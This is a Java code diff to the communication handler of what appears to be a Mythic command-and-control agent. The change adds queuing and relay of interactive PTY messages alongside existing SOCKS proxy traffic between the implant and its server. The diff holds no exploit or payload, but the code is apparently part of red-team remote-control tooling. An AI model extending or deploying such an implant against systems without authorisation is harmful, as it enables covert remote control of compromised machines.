@@ -27,6 +27,7 @@ public class CommunicationHandler {
     private final C2Profile profile;
     private final ObjectMapper objectMapper;
     private String callbackUuid;
+    private final List<Map<String, Object>> pendingInteractiveMessages = new ArrayList<>();
     
     public CommunicationHandler(Config config) throws Exception {
         this.config = config;
@@ -160,6 +161,19 @@ public class CommunicationHandler {
             result.put("socks", socksList);
         }
         
+        // Extract interactive array if present
+        if (responseJson.has("interactive")) {
+            JsonNode interactiveNode = responseJson.get("interactive");
+            List<Map<String, Object>> interactiveList = new ArrayList<>();
+            if (interactiveNode.isArray()) {
+                for (JsonNode interactiveMsg : interactiveNode) {
+                    interactiveList.add(objectMapper.convertValue(interactiveMsg, Map.class));
+                }
+            }
+            Config.debugLog(config, "Received " + interactiveList.size() + " interactive message(s)");
+            result.put("interactive", interactiveList);
+        }
+        
         return result;
     }
     
@@ -175,12 +189,14 @@ public class CommunicationHandler {
      * Send task results back to Mythic
      */
     public List<Map<String, Object>> sendTaskResults(List<Map<String, Object>> taskResults) throws Exception {
-        if (taskResults.isEmpty()) {
+        // Only return early if there are NO task results AND no pending interactive messages
+        if (taskResults.isEmpty() && pendingInteractiveMessages.isEmpty()) {
             return new ArrayList<>();
         }
         
         Config.debugLog(config, "=== SENDING TASK RESULTS ===");
         Config.debugLog(config, "Number of results: " + taskResults.size());
+        Config.debugLog(config, "Number of pending interactive messages: " + pendingInteractiveMessages.size());
         
         // Separate regular responses from SOCKS messages (like oopsie does)
         List<Map<String, Object>> regularResponses = new ArrayList<>();
@@ -229,6 +245,14 @@ public class CommunicationHandler {
         if (!socksMessages.isEmpty()) {
             postResponse.put("socks", socksMessages);
             Config.debugLog(config, "Extracted " + socksMessages.size() + " SOCKS message(s) to top-level field");
+        }
+        
+        // Add interactive messages at top level if any exist (for PTY, etc.)
+        if (!pendingInteractiveMessages.isEmpty()) {
+            // Create a copy to avoid clearing the reference we're about to serialize
+            postResponse.put("interactive", new ArrayList<>(pendingInteractiveMessages));
+            Config.debugLog(config, "Added " + pendingInteractiveMessages.size() + " interactive message(s) to top-level field");
+            pendingInteractiveMessages.clear(); // Clear after copying
         }
         
         String jsonBody = objectMapper.writeValueAsString(postResponse);
@@ -505,5 +529,20 @@ public class CommunicationHandler {
             // No encryption: skip UUID prefix
             return new String(decoded, 36, decoded.length - 36);
         }
+    }
+    
+    /**
+     * Add interactive messages (PTY, etc.) to be sent at top level in next post_response
+     */
+    public void addInteractiveMessages(List<Map<String, Object>> interactiveMessages) {
+        pendingInteractiveMessages.addAll(interactiveMessages);
+        Config.debugLog(config, "Added " + interactiveMessages.size() + " interactive message(s) to pending queue");
+    }
+    
+    /**
+     * Check if there are pending interactive messages to send
+     */
+    public boolean hasPendingInteractiveMessages() {
+        return !pendingInteractiveMessages.isEmpty();
     }
 }
